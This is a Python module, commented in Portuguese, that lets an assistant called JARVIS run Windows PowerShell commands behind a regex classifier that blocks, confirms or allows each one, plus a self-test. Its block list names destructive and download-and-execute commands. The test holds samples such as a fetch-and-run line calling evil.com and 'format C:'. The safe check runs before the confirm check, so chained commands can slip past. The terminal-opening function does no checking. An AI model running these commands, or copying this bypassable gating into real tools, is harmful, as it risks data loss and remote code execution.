"""
Módulo de integração com Terminal Windows para o JARVIS.
Permite executar comandos PowerShell e CMD com sistema de segurança em 3 níveis.

Níveis de Segurança:
- BLOCKED: Comandos perigosos, nunca executar
- CONFIRM: Comandos que modificam sistema, pedir confirmação
- SAFE: Comandos de leitura, executar diretamente
"""

import asyncio
import subprocess
import logging
import re
from typing import Literal, Dict, Any, List

logger = logging.getLogger(__name__)

# ============== CLASSIFICAÇÃO DE SEGURANÇA ==============

CommandSafety = Literal["BLOCKED", "CONFIRM", "SAFE"]

# Padrões BLOQUEADOS - Nunca executar
BLOCKED_PATTERNS: List[str] = [
    # Destruição de dados
    r"format\s+[a-z]:",
    r"del\s+/[sq].*\*",
    r"rd\s+/s\s+/q",
    r"rmdir\s+/s\s+/q",
    r"remove-item.*-recurse.*-force.*[c-z]:\\?$",
    r"remove-item.*-recurse.*-force\s+/",
    r"del\s+\*\.\*",
    r"erase\s+\*",
    
    # Manipulação crítica do sistema
    r"reg\s+delete",
    r"\bbcdedit\b",
    r"\bdiskpart\b",
    r"\bcipher\s+/w",
    r"net\s+user\s+\w+\s+/delete",
    r"net\s+localgroup\s+administrators",
    
    # Desligamento/reinício
    r"\bshutdown\b",
    r"restart-computer",
    r"stop-computer",
    
    # Boot/recuperação
    r"\bbootrec\b",
    r"\bbcdboot\b",
    r"\breagentc\b",
    
    # PowerShell perigoso - download + execute
    r"invoke-expression",
    r"\biex\s*\(",
    r"downloadstring.*\|\s*iex",
    r"invoke-webrequest.*\|\s*iex",
    r"set-executionpolicy\s+unrestricted",
    r"-exec(?:utionpolicy)?\s+bypass",
    
    # Registry crítico
    r"remove-itemproperty",
    r"set-itemproperty.*\\\\run",
    
    # Segurança do sistema
    r"netsh\s+advfirewall.*state\s+off",
    r"set-mppreference.*-disable",
]

# Padrões que REQUEREM CONFIRMAÇÃO
CONFIRM_PATTERNS: List[str] = [
    # Modificação de arquivos
    r"\bdel\b(?!\s+/\?)",
    r"remove-item",
    r"\brd\b",
    r"\brmdir\b",
    r"\bmove\b",
    r"\bmv\b",
    r"rename-item",
    r"copy-item.*-force",
    
    # Serviços
    r"stop-service",
    r"start-service",
    r"restart-service",
    r"\bsc\s+(stop|delete|config)",
    
    # Processos
    r"\btaskkill\b",
    r"stop-process",
    r"\bkill\b",
    
    # Rede
    r"\bnetsh\b",
    r"route\s+(add|delete)",
    
    # Downloads
    r"invoke-webrequest",
    r"\bcurl\b",
    r"\bwget\b",
    
    # Administração
    r"net\s+user",
    r"net\s+localgroup",
    r"net\s+share",
    r"schtasks\s+/(create|delete)",
    
    # Instalação de pacotes
    r"install-module",
    r"uninstall-module",
    r"install-package",
    r"uninstall-package",
    
    # Start-Process (pode executar qualquer coisa)
    r"start-process",
]

# Padrões SEGUROS - execução direta
SAFE_PATTERNS: List[str] = [
    # Navegação e listagem
    r"^\s*dir\b",
    r"^\s*ls\b",
    r"^\s*get-childitem\b",
    r"^\s*pwd\b",
    r"^\s*cd\b",
    r"^\s*set-location\b",
    r"^\s*get-location\b",
    r"^\s*tree\b",
    
    # Leitura de arquivos
    r"^\s*type\b",
    r"^\s*cat\b",
    r"^\s*get-content\b",
    r"^\s*more\b",
    r"^\s*head\b",
    r"^\s*tail\b",
    r"^\s*select-string\b",
    r"^\s*findstr\b",
    
    # Informações do sistema
    r"^\s*systeminfo\b",
    r"^\s*hostname\b",
    r"^\s*whoami\b",
    r"^\s*ver\b",
    r"^\s*get-computerinfo\b",
    r"^\s*get-process\b",
    r"^\s*get-service\b",
    r"^\s*tasklist\b",
    r"^\s*netstat\b",
    r"^\s*ipconfig\b",
    r"^\s*ping\b",
    
    # Variáveis de ambiente
    r"^\s*echo\b",
    r"^\s*write-output\b",
    r"^\s*\$env:",
    r"^\s*get-env\b",
    
    # Git (somente leitura)
    r"^\s*git\s+status\b",
    r"^\s*git\s+log\b",
    r"^\s*git\s+branch\b",
    r"^\s*git\s+diff\b",
    r"^\s*git\s+remote\b",
    r"^\s*git\s+show\b",
    
    # Data e hora
    r"^\s*date\b",
    r"^\s*get-date\b",
    r"^\s*time\b",
    
    # Disco (somente leitura)
    r"^\s*get-volume\b",
    r"^\s*get-disk\b",
    r"^\s*get-partition\b",
    r"^\s*fsutil\s+volume\s+diskfree\b",
    
    # Aplicações comuns
    r"^\s*code\b",
    r"^\s*notepad\b",
    r"^\s*explorer\b",
    r"^\s*calc\b",
]


def classify_command(comando: str) -> tuple[CommandSafety, str]:
    """
    Classifica um comando em um dos três níveis de segurança.
    
    Args:
        comando: O comando a ser classificado
    
    Returns:
        Tuple de (nível de segurança, motivo)
    """
    comando_lower = comando.lower().strip()
    
    # Verificar se é BLOQUEADO
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, comando_lower, re.IGNORECASE):
            return ("BLOCKED", f"Comando perigoso detectado: padrão '{pattern}'")
    
    # Verificar se é SEGURO (prioridade sobre CONFIRM para comandos simples)
    for pattern in SAFE_PATTERNS:
        if re.search(pattern, comando_lower, re.IGNORECASE):
            return ("SAFE", "Comando de leitura/navegação")
    
    # Verificar se REQUER CONFIRMAÇÃO
    for pattern in CONFIRM_PATTERNS:
        if re.search(pattern, comando_lower, re.IGNORECASE):
            return ("CONFIRM", f"Comando pode modificar o sistema: padrão '{pattern}'")
    
    # Por padrão, comandos desconhecidos requerem confirmação
    return ("CONFIRM", "Comando desconhecido - requer confirmação por segurança")


async def execute_windows_command(
    comando: str,
    confirmed: bool = False,
    timeout: int = 30,
    max_output: int = 2000
) -> Dict[str, Any]:
    """
    Executa um comando PowerShell no Windows.
    
    Args:
        comando: Comando a executar
        confirmed: Se True, executa mesmo comandos que requerem confirmação
        timeout: Tempo limite em segundos
        max_output: Máximo de caracteres na saída
    
    Returns:
        Dict com success, output, error, blocked, needs_confirmation, etc.
    """
    # Classificar comando
    safety, reason = classify_command(comando)
    
    # Comando bloqueado - nunca executar
    if safety == "BLOCKED":
        logger.warning(f"Comando BLOQUEADO: {comando}")
        return {
            "success": False,
            "blocked": True,
            "error": f"⛔ Comando bloqueado por segurança. {reason}",
            "output": "",
            "return_code": -1
        }
    
    # Comando que requer confirmação
    if safety == "CONFIRM" and not confirmed:
        logger.info(f"Comando requer confirmação: {comando}")
        return {
            "success": False,
            "needs_confirmation": True,
            "reason": reason,
            "error": "",
            "output": "",
            "return_code": -1
        }
    
    # Executar comando
    logger.info(f"Executando comando Windows: {comando}")
    
    try:
        process = await asyncio.create_subprocess_exec(
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            process.kill()
            return {
                "success": False,
                "timeout": True,
                "error": f"Comando excedeu o tempo limite de {timeout}s",
                "output": "",
                "return_code": -1
            }
        
        # Decodificar saída
        output = stdout.decode('utf-8', errors='replace').strip()
        error = stderr.decode('utf-8', errors='replace').strip()
        
        # Truncar se muito longo
        if len(output) > max_output:
            output = output[:max_output] + f"\n... (truncado, {len(output)} caracteres total)"
        
        return {
            "success": process.returncode == 0,
            "output": output,
            "error": error,
            "return_code": process.returncode,
            "blocked": False,
            "needs_confirmation": False
        }
        
    except Exception as e:
        logger.error(f"Erro ao executar comando: {e}")
        return {
            "success": False,
            "error": str(e),
            "output": "",
            "return_code": -1
        }


async def open_terminal_with_command(
    comando: str = "",
    title: str = "JARVIS Terminal",
    keep_open: bool = True
) -> Dict[str, Any]:
    """
    Abre uma janela de terminal VISÍVEL para o usuário.
    
    Args:
        comando: Comando a executar no terminal
        title: Título da janela
        keep_open: Se True, mantém terminal aberto após comando
    
    Returns:
        Dict com success e message
    """
    try:
        # Construir comando PowerShell
        if comando:
            if keep_open:
                ps_cmd = f'Start-Process powershell -ArgumentList "-NoExit", "-Command", "& {{{comando}}}" -WindowStyle Normal'
            else:
                ps_cmd = f'Start-Process powershell -ArgumentList "-Command", "& {{{comando}}}" -WindowStyle Normal'
        else:
            ps_cmd = 'Start-Process powershell -WindowStyle Normal'
        
        process = await asyncio.create_subprocess_exec(
            "powershell.exe",
            "-NoProfile",
            "-Command",
            ps_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        await process.communicate()
        
        return {
            "success": True,
            "message": f"Terminal aberto" + (f" com comando: {comando}" if comando else "")
        }
        
    except Exception as e:
        logger.error(f"Erro ao abrir terminal: {e}")
        return {
            "success": False,
            "error": str(e)
        }


# ============== TESTE ==============

if __name__ == "__main__":
    import asyncio
    
    print("=== TESTE DE CLASSIFICAÇÃO DE COMANDOS ===\n")
    
    test_commands = [
        # Seguros
        ("dir", "SAFE"),
        ("Get-Process", "SAFE"),
        ("ipconfig /all", "SAFE"),
        ("git status", "SAFE"),
        ("code .", "SAFE"),
        
        # Confirmação
        ("del arquivo.txt", "CONFIRM"),
        ("Remove-Item teste.txt", "CONFIRM"),
        ("Stop-Process -Name notepad", "CONFIRM"),
        ("taskkill /im chrome.exe", "CONFIRM"),
        
        # Bloqueados
        ("format C:", "BLOCKED"),
        ("del /s /q *.*", "BLOCKED"),
        ("shutdown /s", "BLOCKED"),
        ("iex(downloadstring('http://evil.com'))", "BLOCKED"),
        ("bcdedit /set", "BLOCKED"),
    ]
    
    print("Comando                                    | Esperado  | Resultado | OK?")
    print("-" * 80)
    
    for cmd, expected in test_commands:
        result, reason = classify_command(cmd)
        ok = "✅" if result == expected else "❌"
        print(f"{cmd:40} | {expected:9} | {result:9} | {ok}")
    
    print("\n=== TESTE DE EXECUÇÃO ===\n")
    
    async def test_exec():
        # Teste comando seguro
        result = await execute_windows_command("Get-Date")
        print(f"Get-Date: {result['output'][:50]}...")
        
        # Teste comando que requer confirmação
        result = await execute_windows_command("del teste.txt")
        print(f"del teste.txt: needs_confirmation={result.get('needs_confirmation')}")
        
        # Teste comando bloqueado
        result = await execute_windows_command("format C:")
        print(f"format C:: blocked={result.get('blocked')}")
    
    asyncio.run(test_exec())
